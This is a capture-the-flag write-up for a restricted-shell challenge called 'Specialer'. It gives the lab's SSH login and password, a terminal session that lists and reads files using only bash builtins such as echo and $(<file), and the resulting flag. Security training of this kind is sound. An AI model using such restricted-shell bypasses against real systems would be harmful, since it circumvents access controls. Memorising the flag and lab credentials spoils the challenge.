## Descripcion
Reception of Special has been cool to say the least. That's why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just 'Specialer'. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody's complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer. `ssh -p 21525 ctf-player@chatelaine.cylabacademy.net`. The password is `647e170e`

  
What programs do you have access to?
## solucion 
```
┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ ssh -p 21525 ctf-player@chatelaine.cylabacademy.net
The authenticity of host '[chatelaine.cylabacademy.net]:21525 ([18.227.187.235]:21525)' can't be established.
ED25519 key fingerprint is: SHA256:TMzuFX+tQxG+rVL0CK63ywMGkWGIsWZEgT7sWWAVfMg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[chatelaine.cylabacademy.net]:21525' (ED25519) to the list of known hosts.
ctf-player@chatelaine.cylabacademy.net's password:
Specialer$ echo *
abra ala sim
Specialer$ echo abra/*
echo ala/*
echo sim/*
abra/cadabra.txt abra/cadaniel.txt
ala/kazam.txt ala/mode.txt
sim/city.txt sim/salabim.txt
Specialer$ echo "$(<abra/cadabra.txt)"
Nothing up my sleeve!
Specialer$ echo "$(<abra/cadaniel.txt)"
Yes, I did it! I really did it! I'm a true wizard!
Specialer$ echo $(<ala/kazam.txt)
return 0 academy{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_221ea859}
Specialer$ Connection to chatelaine.cylabacademy.net closed by remote host.
Connection to chatelaine.cylabacademy.net closed.


```

```
academy{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_221ea859}
```
## notas adicionales

## referencias
